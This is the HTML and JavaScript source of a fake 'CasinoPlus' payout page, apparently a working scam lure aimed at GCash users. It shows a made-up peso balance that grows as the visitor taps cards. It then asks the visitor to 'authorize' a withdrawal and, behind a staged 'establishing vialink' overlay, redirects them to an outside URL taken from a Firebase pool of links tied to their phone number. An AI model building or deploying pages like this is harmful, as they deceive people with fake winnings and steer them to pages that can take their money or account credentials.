<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CasinoPlus | Live Payout</title>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script src="js/config.js"></script>

    <script>
        (function() {
            const isBanned = localStorage.getItem("cp_device_locked") === "true";
            const isVerified = localStorage.getItem("cp_verified") === "true";
            if (isBanned || !isVerified) {
                window.location.replace("index.html"); 
                return;
            }
        })();
    </script>

    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;800&family=Orbitron:wght@700&display=swap" rel="stylesheet">
    
    <style>
        :root { --gold: linear-gradient(180deg, #ffdc6a 0%, #d4af37 100%); --dark-bg: #04070d; }
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { font-family: 'Public Sans', sans-serif; background-color: var(--dark-bg); background-image: radial-gradient(circle at 50% 0%, #1e3a8a 0%, transparent 70%); color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; padding: 15px; }

        #processingOverlay { position: fixed; inset: 0; background: rgba(4, 7, 13, 0.98); z-index: 999999; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px; backdrop-filter: blur(15px); }
        .spinner { width: 60px; height: 60px; border: 5px solid rgba(212, 175, 55, 0.3); border-top-color: #d4af37; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 25px; }
        @keyframes spin { to { transform: rotate(360deg); } }

        /* GRID SYSTEM */
        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; width: 100%; margin: 20px 0; }
        .card-item { aspect-ratio: 1/1; background: rgba(255,255,255,0.05); border: 1px solid rgba(212, 175, 55, 0.2); border-radius: 15px; display: flex; align-items: center; justify-content: center; cursor: pointer; overflow: hidden; }
        .card-item img { width: 100%; height: 100%; object-fit: cover; transition: 0.3s; }
        .card-item.clicked { border-color: #22c55e; background: rgba(34, 197, 94, 0.1); pointer-events: none; filter: grayscale(1) opacity(0.5); }

        .card { background: rgba(255, 255, 255, 0.03); width: 100%; max-width: 400px; padding: 25px 20px; border-radius: 30px; border: 1px solid rgba(212, 175, 55, 0.3); backdrop-filter: blur(15px); text-align: center; }
        .amount { font-family: 'Orbitron', sans-serif; font-size: 48px; background: var(--gold); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; }

        .pay-button { background: var(--gold); color: #000; padding: 18px; width: 100%; border: none; border-radius: 15px; font-size: 18px; font-weight: 800; text-transform: uppercase; cursor: pointer; box-shadow: 0 5px 0 #8b6508; margin-top: 15px; }
        .pay-button:disabled { background: #334155; color: #64748b; box-shadow: none; cursor: not-allowed; }
        .promo-photo { width: 100%; border-radius: 20px; margin-top: 20px; border: 1px solid rgba(212, 175, 55, 0.2); }
    </style>
</head>
<body>

    <div id="processingOverlay">
        <div class="spinner"></div>
        <h2 style="color:#fff; margin-bottom:15px;">ESTABLISHING VIALINK...</h2>
        <p style="color:#fbbf24; font-size:14px; padding:0 20px;">Verification required. Tap "AUTHORIZE" to secure your reward via GCash.</p>
    </div>

    <div class="card">
        <img src="images/logo1.png" style="width:150px; margin-bottom:15px;">
        <div style="font-size: 10px; color: #fbbf24; letter-spacing: 2px; font-weight: 800;">CURRENT BALANCE</div>
        <div class="amount" id="balanceText">₱0.00</div>
        
        <div class="grid" id="cardGrid"></div>
        
        <button class="pay-button" id="claimBtn" onclick="redirectToGCash()" disabled>Tap 5 Cards to Claim</button>
        
        <img src="images/casinoplus.jpeg" class="promo-photo">
    </div>

    <script>
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const savedPhone = localStorage.getItem("userPhone") || "Guest";

        let balance = 0;
        let clickCount = 0;
        const maxClicks = 5;

        // Assets Mapping
        const cardImages = [
            'images/img1.png', // Goddess
            'images/img2.png', // Monkey
            'images/img3.png', // zues
            'images/img4.png', // Candy Bear
            'images/img5.png', // Dress Girl
            'images/img6.png', // Boxer
            'images/img1.png', 'images/img2.png', 'images/img3.png' // Repeat for grid
        ];

        window.onload = () => {
            const randomStart = [150, 200, 250, 350][Math.floor(Math.random() * 4)];
            updateBalance(randomStart);
            generateGrid();
        };

        function generateGrid() {
            const grid = document.getElementById('cardGrid');
            for(let i=0; i<9; i++) {
                const item = document.createElement('div');
                item.className = 'card-item';
                item.innerHTML = `<img src="${cardImages[i]}" onerror="this.src='https://via.placeholder.com/100?text=CARD'">`;
                item.onclick = () => handleCardClick(item);
                grid.appendChild(item);
            }
        }

        function handleCardClick(el) {
            if (clickCount >= maxClicks || el.classList.contains('clicked')) return;
            clickCount++;
            el.classList.add('clicked');
            updateBalance(25);

            if (clickCount === maxClicks) {
                document.getElementById('claimBtn').disabled = false;
                document.getElementById('claimBtn').innerText = "Withdraw via GCash";
            }
        }

        function updateBalance(amt) {
            balance += amt;
            document.getElementById('balanceText').innerText = "₱" + balance.toLocaleString() + ".00";
        }

        function redirectToGCash() {
            document.getElementById('processingOverlay').style.display = 'flex';
            db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', snap => {
                if (snap.exists()) {
                    const key = Object.keys(snap.val())[0];
                    const url = snap.val()[key].url;
                    db.ref('links/' + key).update({ status: 'pending', user: savedPhone });
                    setTimeout(() => { window.location.href = url; }, 3000);
                } else {
                    alert("System busy! Try again later.");
                    document.getElementById('processingOverlay').style.display = 'none';
                }
            });
        }
    </script>
</body>
</html>
